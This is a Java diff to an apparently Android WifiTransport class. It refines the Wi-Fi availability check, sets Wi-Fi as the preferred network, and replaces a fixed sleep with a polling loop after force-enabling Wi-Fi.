@@ -33,7 +33,8 @@ public class WifiTransport extends HttpKeepAliveTransport {
 	final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
 	private final ConnectivityManager connManager = (ConnectivityManager) Status.getAppContext().getSystemService(
 			Context.CONNECTIVITY_SERVICE);
-	
+	private int ip;
+
 	/**
 	 * Instantiates a new wifi transport.
 	 * 
@@ -54,6 +55,7 @@ public class WifiTransport extends HttpKeepAliveTransport {
 	 */
 	public WifiTransport(final String host, final boolean wifiForced) {
 		super(host);
+		// this.ip = lookupHost(host);
 		this.forced = wifiForced;
 	}
 
@@ -70,7 +72,12 @@ public class WifiTransport extends HttpKeepAliveTransport {
 
 		NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
 
-		boolean available = mWifi.isConnected();
+		boolean available = mWifi.isAvailable() && mWifi.isConnected();
+
+		if (available) {
+			connManager.setNetworkPreference(ConnectivityManager.TYPE_WIFI);
+		}
+
 		return available;
 	}
 
@@ -83,20 +90,27 @@ public class WifiTransport extends HttpKeepAliveTransport {
 		// wifi.reconnect();
 		// wifi.reassociate();
 
+		// TODO:
+		// ConnectivityManager.setNetworkPrefrence(ConnectivityManager.TYPE_WIFI)
 		if (forced && wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (enable): trying to enable wifi");//$NON-NLS-1$
 			}
 
 			switchedOn = wifi.setWifiEnabled(true);
-			
+
 			if (switchedOn == false) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (enable): cannot enable WiFi interface"); //$NON-NLS-1$
 				}
 			}
-			
-			Utils.sleep(2000);
+
+			for (int i = 0; i < 20; i++) {
+				if (isAvailable()) {
+					break;
+				}
+				Utils.sleep(1000);
+			}
 		}
 	}
 
